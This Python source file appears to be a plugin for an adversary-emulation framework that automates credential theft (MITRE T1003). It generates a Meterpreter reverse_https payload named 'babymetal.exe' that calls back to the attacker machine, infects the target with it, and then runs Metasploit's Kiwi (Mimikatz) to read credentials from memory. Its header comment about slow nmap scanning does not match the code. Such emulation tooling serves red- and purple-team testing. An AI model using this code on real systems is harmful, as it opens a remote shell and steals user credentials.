#!/usr/bin/env python3

# A plugin to nmap targets slow motion, to evade sensors

from plugins.base.attack import AttackPlugin, Requirement
import socket


class MetasploitKiwiPlugin(AttackPlugin):

    # Boilerplate
    name = "metasploit_kiwi"
    description = "Extract credentials from memory. Kiwi is the more modern Mimikatz"
    ttp = "T1003"
    references = ["https://www.hackers-arise.com/post/2018/11/26/metasploit-basics-part-21-post-exploitation-with-mimikatz"]

    required_files = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share

    requirements = [Requirement.METASPLOIT]

    def __init__(self):
        super().__init__()
        self.plugin_path = __file__

    def run(self, targets):
        """ Run the command

        @param targets: A list of targets, ip addresses will do
        """

        self.attack_logger.start_narration("Extracting user credentials from memory.")
        res = ""
        payload_type = "windows/x64/meterpreter/reverse_https"
        payload_name = "babymetal.exe"
        target = self.targets[0]

        ip = socket.gethostbyname(self.attacker_machine_plugin.get_ip())

        self.metasploit.smart_infect(target,
                                     payload=payload_type,
                                     architecture="x64",
                                     platform="windows",
                                     lhost=ip,
                                     format="exe",
                                     outfile=payload_name)

        self.metasploit.kiwi(target,
                             variant=self.conf['variant'],
                             situation_description="Kiwi is the modern version of mimikatz. It is integrated into metasploit. The attacker wants to get some credentials - reading them from memory.",
                             countermeasure="Memory access into critical processes should be monitored."
                             )

        return res
